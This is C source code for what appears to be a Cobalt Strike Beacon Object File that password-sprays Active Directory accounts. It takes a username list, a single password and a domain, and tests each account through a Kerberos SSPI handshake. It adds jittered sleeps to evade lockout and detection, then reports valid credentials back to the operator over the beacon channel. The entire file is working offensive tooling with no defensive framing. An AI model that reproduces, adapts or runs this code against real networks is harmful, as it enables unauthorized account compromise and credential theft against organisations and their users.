#define SECURITY_WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <security.h>
#include <stdio.h>
#include <time.h>
#include <stdlib.h>
#include <dsgetdc.h>
#include <lm.h> 
#include "passwordspray.h"
#include "beacon.h"

#pragma comment(lib, "secur32.lib")
#pragma comment(lib, "ws2_32.lib")

#define MAX_TOKEN_SIZE 12000


//START TrustedSec BOF print code: https://github.com/trustedsec/CS-Situational-Awareness-BOF/blob/master/src/common/base.c
#ifndef bufsize
#define bufsize 8192
#endif
char *output = 0;  
WORD currentoutsize = 0;
HANDLE trash = NULL; 
int bofstart();
void internal_printf(const char* format, ...);
void printoutput(BOOL done);

int bofstart() {   
    output = (char*)MSVCRT$calloc(bufsize, 1);
    currentoutsize = 0;
    return 1;
}

void internal_printf(const char* format, ...){
    int buffersize = 0;
    int transfersize = 0;
    char * curloc = NULL;
    char* intBuffer = NULL;
    va_list args;
    va_start(args, format);
    buffersize = MSVCRT$vsnprintf(NULL, 0, format, args); 
    va_end(args);
    
    if (buffersize == -1) return;
    
    char* transferBuffer = (char*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, bufsize);
	intBuffer = (char*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, buffersize);
    va_start(args, format);
    MSVCRT$vsnprintf(intBuffer, buffersize, format, args); 
    va_end(args);
    if(buffersize + currentoutsize < bufsize) 
    {
        MSVCRT$memcpy(output+currentoutsize, intBuffer, buffersize);
        currentoutsize += buffersize;
    } else {
        curloc = intBuffer;
        while(buffersize > 0)
        {
            transfersize = bufsize - currentoutsize;
            if(buffersize < transfersize) 
            {
                transfersize = buffersize;
            }
            MSVCRT$memcpy(output+currentoutsize, curloc, transfersize);
            currentoutsize += transfersize;
            if(currentoutsize == bufsize)
            {
                printoutput(FALSE); 
            }
            MSVCRT$memset(transferBuffer, 0, transfersize); 
            curloc += transfersize; 
            buffersize -= transfersize;
        }
    }
	KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, intBuffer);
	KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, transferBuffer);
}

void printoutput(BOOL done) {
    char * msg = NULL;
    BeaconOutput(CALLBACK_OUTPUT, output, currentoutsize);
    currentoutsize = 0;
    MSVCRT$memset(output, 0, bufsize);
    if(done) {MSVCRT$free(output); output=NULL;}
}
//END TrustedSec BOF print code.


void sleeptimer_with_jitter(int base_seconds, int jitter_percent) {
    MSVCRT$srand((unsigned int)MSVCRT$time(NULL));
    int jitter_range = (base_seconds * jitter_percent) / 100;
    int jitter = (MSVCRT$rand() % (2 * jitter_range + 1)) - jitter_range;
    int total_sleep_time = base_seconds + jitter;

    if (total_sleep_time < 0) {
        total_sleep_time = 0;
    }

    clock_t end_time = MSVCRT$clock() + total_sleep_time * CLOCKS_PER_SEC;
    while (MSVCRT$clock() < end_time) {
        // Busy wait
    }
}


BOOL authenticate_user(WCHAR* wDomain, WCHAR* wUsername, WCHAR* wPassword) {
	LPWSTR wAuthPackage = L"Kerberos"; 
    BOOL authResult = FALSE;
    PBYTE clientToServerToken = NULL;
    PBYTE serverToClientToken = NULL;
    HINSTANCE secur32Handle = NULL;
    CredHandle clientCredHandle;
    CredHandle serverCredHandle;
	
    // Load the Secur32.dll library
    secur32Handle = KERNEL32$LoadLibraryA("Secur32.dll");
    if (secur32Handle == NULL) {
        return FALSE;
    }
	
    // Specify the credentials to verify
    SEC_WINNT_AUTH_IDENTITY_EXW authIdentity = {
        SEC_WINNT_AUTH_IDENTITY_VERSION,
        sizeof(authIdentity),
        (unsigned short *)wUsername,
        (ULONG)MSVCRT$wcslen(wUsername),
        (unsigned short *)wDomain,
        (ULONG)MSVCRT$wcslen(wDomain),
        (unsigned short *)wPassword,
        (ULONG)MSVCRT$wcslen(wPassword),
        SEC_WINNT_AUTH_IDENTITY_UNICODE,
        0, 0
    };

    // Get an SSPI handle for these credentials
    TimeStamp clientExpiry;
    SECURITY_STATUS secStatus = SECUR32$AcquireCredentialsHandleW(NULL, wAuthPackage, SECPKG_CRED_OUTBOUND, NULL, &authIdentity, NULL, NULL, &clientCredHandle, &clientExpiry);
    if (secStatus != SEC_E_OK) {
        return FALSE;
    }
	
    // Use the caller's credentials for the server
    TimeStamp serverExpiry;
    secStatus = SECUR32$AcquireCredentialsHandleW(
        NULL, wAuthPackage, SECPKG_CRED_INBOUND, NULL, NULL, NULL, NULL, &serverCredHandle, &serverExpiry);
    if (secStatus != SEC_E_OK) {
        goto CleanUp;
    }
	
    CtxtHandle clientContextHandle;
    CtxtHandle serverContextHandle;

    // Allocate buffers for client-server and server-client tokens
    clientToServerToken = (PBYTE)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_TOKEN_SIZE);
    if (clientToServerToken == NULL) {
        goto CleanUp;
    }

    serverToClientToken = (PBYTE)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_TOKEN_SIZE);
    if (serverToClientToken == NULL) {
        goto CleanUp;
    }

    SecBuffer clientToServerSecBuffer = { MAX_TOKEN_SIZE, SECBUFFER_TOKEN, clientToServerToken };
    SecBuffer serverToClientSecBuffer = { MAX_TOKEN_SIZE, SECBUFFER_TOKEN, serverToClientToken };
    SecBufferDesc clientToServerBufferDesc = { SECBUFFER_VERSION, 1, &clientToServerSecBuffer };
    SecBufferDesc serverToClientBufferDesc = { SECBUFFER_VERSION, 1, &serverToClientSecBuffer };

    DWORD clientContextAttributes = ISC_REQ_CONNECTION;
    DWORD serverContextAttributes = ISC_REQ_CONNECTION;

    PCtxtHandle clientContextHandleIn = NULL;
    PCtxtHandle clientContextHandleOut = &clientContextHandle;
    PCtxtHandle serverContextHandleIn = NULL;
    PCtxtHandle serverContextHandleOut = &serverContextHandle;

    SecBufferDesc* clientInputBuffer = NULL;
    SecBufferDesc* clientOutputBuffer = &clientToServerBufferDesc;
    SecBufferDesc* serverInputBuffer = &clientToServerBufferDesc;
    SecBufferDesc* serverOutputBuffer = &serverToClientBufferDesc;

    DWORD clientContextAttributesOut = 0;
    DWORD serverContextAttributesOut = 0;
    TimeStamp clientContextExpiry;
    TimeStamp serverContextExpiry;

    // Get a server principal name for Kerberos
    WCHAR serverPrincipalName[256];
    ULONG serverPrincipalNameLength = sizeof(serverPrincipalName) / sizeof(*serverPrincipalName);
    secStatus = SECUR32$GetUserNameExW(NameSamCompatible, serverPrincipalName, &serverPrincipalNameLength);
    if (secStatus == 0) {
        goto CleanUp;
    }

    // Perform the authentication handshake
    BOOL clientContinue = TRUE;
    BOOL serverContinue = TRUE;
    while (clientContinue || serverContinue) {
        if (clientContinue) {
            clientToServerSecBuffer.cbBuffer = MAX_TOKEN_SIZE;
            secStatus = SECUR32$InitializeSecurityContextW(
                &clientCredHandle, clientContextHandleIn, serverPrincipalName,
                clientContextAttributes, 0, SECURITY_NATIVE_DREP,
                clientInputBuffer, 0, clientContextHandleOut, clientOutputBuffer,
                &clientContextAttributesOut, &clientContextExpiry);
            switch (secStatus) {
                case SEC_E_OK:
                    clientContinue = FALSE;
                    break;
                case SEC_I_CONTINUE_NEEDED:
                    clientContextHandleIn = clientContextHandleOut;
                    clientInputBuffer = serverOutputBuffer;
                    break;
                default:
                    goto CleanUp;
            }
        }

        if (serverContinue) {
            serverToClientSecBuffer.cbBuffer = MAX_TOKEN_SIZE;
            secStatus = SECUR32$AcceptSecurityContext(
                &serverCredHandle, serverContextHandleIn, serverInputBuffer,
                serverContextAttributes, SECURITY_NATIVE_DREP,
                serverContextHandleOut, serverOutputBuffer,
                &serverContextAttributesOut, &serverContextExpiry);
            switch (secStatus) {
                case SEC_E_OK:
                    serverContinue = FALSE;
                    break;
                case SEC_I_CONTINUE_NEEDED:
                    serverContextHandleIn = serverContextHandleOut;
                    break;
                default:
                    goto CleanUp;
            }
        }
    }
	SECUR32$DeleteSecurityContext(&clientContextHandle);
	SECUR32$DeleteSecurityContext(&serverContextHandle);
	
    authResult = TRUE;

CleanUp:
    if (clientCredHandle.dwUpper || clientCredHandle.dwLower) {
        SECUR32$FreeCredentialsHandle(&clientCredHandle);
    }
    if (serverCredHandle.dwUpper || serverCredHandle.dwLower) {
        SECUR32$FreeCredentialsHandle(&serverCredHandle);
    }
    if (clientToServerToken) {
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, clientToServerToken);
    }
    if (serverToClientToken) {
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, serverToClientToken);
    }

    return authResult;
}


int go(char *args, int len) {
	WCHAR* wDomain;
    WCHAR* wPassword;
	WCHAR wUsername[MAX_PATH];
	char* username;
	char* nextUsername;
	int sleepDuration = 0; // in seconds
    int jitterPercent = 0; // in percentage
	int count = 0;
	int iBytesLen = 0;
    CHAR* usernameFileBytes;
    datap parser;
	
	BeaconDataParse(&parser, args, len);
    usernameFileBytes = BeaconDataExtract(&parser, &iBytesLen);
	wPassword = BeaconDataExtract(&parser, NULL);
	wDomain = BeaconDataExtract(&parser, NULL);
	sleepDuration = BeaconDataInt(&parser);
    jitterPercent = BeaconDataInt(&parser); 
	
	if(!bofstart()) return;

	if(iBytesLen != 0) {
		// Log the domain controller being used
		PDOMAIN_CONTROLLER_INFO dcInfo;
		DWORD dcStatus = NETAPI32$DsGetDcNameW(NULL, wDomain, NULL, NULL, 0, &dcInfo);
		if (dcStatus == ERROR_SUCCESS) {
			internal_printf("[*] Authenticated to Domain Controller: %S\n============================================================\n\n", dcInfo->DomainControllerName);
			NETAPI32$NetApiBufferFree(dcInfo);
		}
		
		//start password spray
		username = MSVCRT$strtok(usernameFileBytes, "\r\n");
        while (username != NULL) {
			nextUsername = MSVCRT$strtok(NULL, "\r\n");
			
			KERNEL32$MultiByteToWideChar(CP_ACP, 0, username, -1, wUsername, MAX_PATH);
			BOOL result = authenticate_user(wDomain, wUsername, wPassword);
			if (result) internal_printf("[+] Valid credentials found: %S\\%S:%S\n", wDomain, wUsername, wPassword);

			sleeptimer_with_jitter(sleepDuration, jitterPercent);
			count++;
			
            if (nextUsername == NULL) {
                break;
            }
	        username = nextUsername;
        }
		printoutput(TRUE);
	
    } else {
        BeaconPrintf(CALLBACK_ERROR, "Couldn't load the host file from disk.\n");
    }

	BeaconPrintf(CALLBACK_OUTPUT, "[+] Finished spraying against %d accounts!\n", count); 
    return 0;
}





